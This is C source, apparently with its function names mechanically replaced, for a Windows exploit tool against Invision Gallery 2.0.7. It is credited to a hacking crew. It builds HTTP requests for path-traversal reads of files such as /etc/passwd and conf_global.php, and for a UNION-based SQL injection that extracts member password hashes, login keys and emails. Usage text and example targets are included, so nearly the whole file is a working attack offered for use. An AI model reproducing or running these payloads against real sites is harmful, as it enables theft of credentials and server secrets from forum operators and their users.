#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC1 (int,int) ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*) ; 
 scalar_t__ FUNC6 (char*,char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 

int FUNC8(int argc,char * argv[])
{
WSADATA wsaData;
FUNC3(FUNC1(2,2),&wsaData);

		FUNC4("\n ...............................................................\n");
        FUNC4("  Invision Gallery 2.0.7 ReadFile() & SQL injection exploit       \n");
        FUNC4("         (c)oded by _1nf3ct0r_ // Hell Knights Crew               \n");
		FUNC4("               http://hellknights.void.ru/                        \n");
		FUNC4("  Gr33tz: blackybr, 1dt.w0lf, ShadOS, ZaCo, SkvoznoY, HATS-Team   \n");
		FUNC4(" ...............................................................  \n");
		
	if (argc == 1) {

FUNC4("\n\n [+] ReadFile():\n");
FUNC4("  - syntax:\n");
FUNC4("  readfile 1 <host> <pathtoindex> <localfile> \n");
FUNC4("  readfile 2 <host> <pathtoindex> <localfile>   -- try it 1f readfile[1] failed \n");
FUNC4("  - params: \n");
FUNC4("  <localfile> -  path to local file (../file), f0r example: ../../../../../etc/passwd\n");
FUNC4("  s0, 1f u want to get local path to IPB 7ry th1s: ../../hellknightscrewxploit  \n");
FUNC4("  - examples:\n");
FUNC4("  readfile 1 asd.ru index.php ../../../../../../etc/passwd\n");
FUNC4("  readfile 1 asd.ru forum/index.php ../../conf_global.php\n");
FUNC4("  readfile 1 asd.ru forum/index.php ../../conf_global.php%00\n\n\n");
FUNC4(" [+] SQL-injection:\n");
FUNC4("  - syntax\n");
FUNC4("  sqlinject <host> <pathtoindex> <member_id> <prefix> <column> <table>\n");
FUNC4("  getprefix <host> <pathtoindex>   -- get database prefix from IPB error  \n");
FUNC4("  - params:\n");
FUNC4("  <member_id> -  member's id for SQL-injection result, for example: 1\n");
FUNC4("  <column>    -  ipb members' column to get. for example: ip_adress, email.\n");
FUNC4("  <table>     -  ipb table to use. f0r example: member\n");
FUNC4("  <prefix>    -  database prefix. \n");
FUNC4("  - examples:\n");
FUNC4("  ig.exe sqlinject asd.ru index.php legacy_password ibf_ members 1  \n");
FUNC4("  ig.exe sqlinject asd.ru index.php member_login_key  ibf_ members 1\n");
FUNC4("  ig.exe sqlinject asd.ru forum/index.php ip_adress ibf_ member 5\n\n");
		           return 1;
	               }
	
char * mode = argv[1];


// --- readfile() exploit --- //
if (FUNC6(mode,"readfile")==0)
{ 
char * type = argv[2];
char * path = NULL; path = argv[4];
char * localfile = argv[5];
char * host = argv[3]; 
	if (FUNC6(type,"1")==0)
	{
	char exploit[1024]; 
	FUNC7(exploit, "GET /"); 
	FUNC5(exploit, path); 
	FUNC5(exploit, "?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=");
	FUNC5(exploit, localfile);
    FUNC5(exploit, " HTTP/1.0\r\nHost: ");
	FUNC5(exploit, host); 
	FUNC5(exploit, "\r\n\r\n"); 
FUNC0(exploit, "readfile", host);

	} 
	else if (FUNC6(type,"2")==0)
	{
	char exploit[1024]; 
	FUNC7(exploit, "GET /"); 
	FUNC5(exploit, path); 
	FUNC5(exploit, "?act=gallery&code=viewimage&img=index.gif&dir=");
	FUNC5(exploit, localfile);
    FUNC5(exploit, " HTTP/1.0\r\nHost: ");
	FUNC5(exploit, host); 
	FUNC5(exploit, "\r\n\r\n"); 
FUNC0(exploit, "readfile", host);
	}

// --- sql-injection exploit --- //
} 
if(FUNC6(mode,"sqlinject")==0)
{
char * host = argv[2]; 
char * path = argv[3];
char * prefix = argv[5];
char * column = argv[4];
char * table = argv[6];
char * id = argv[7];

	char exploit[1024]; 
	FUNC7(exploit, "GET /"); 
	FUNC5(exploit, path); 
	FUNC5(exploit, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20union%20select%201,");
	FUNC5(exploit, column);
	FUNC5(exploit, ",1,1,1,1,1,1,1,1%20FROM%20");
	FUNC5(exploit, prefix);
	FUNC5(exploit, table);
	FUNC5(exploit, "%20WHERE%20id=");
	FUNC5(exploit, id);
	FUNC5(exploit, "/*31337*/");
    FUNC5(exploit, " HTTP/1.0\r\nHost: ");
	FUNC5(exploit, host); 
	FUNC5(exploit, "\r\n\r\n"); 
    FUNC0(exploit, "sqlinject", host);
} 
if (FUNC6(mode,"getprefix")==0)
{ 
char * path = argv[3];
char * host = argv[2]; 
	char exploit[1024]; 
	FUNC7(exploit, "GET /"); 
	FUNC5(exploit, path); 
	FUNC5(exploit, "?automodule=gallery&cmd=rate&img=1&rating=1&album=-1%20hellknightscrew");
    FUNC5(exploit, " HTTP/1.0\r\nHost: ");
	FUNC5(exploit, host); 
	FUNC5(exploit, "\r\n\r\n"); 
FUNC4("\n\n\n[!] u can get database prefix from this error. example: SELECT * FROM <PREFIX>gallery_albums\n\n");
FUNC0(exploit, "readfile", host);
}

FUNC2();
	return 0;
}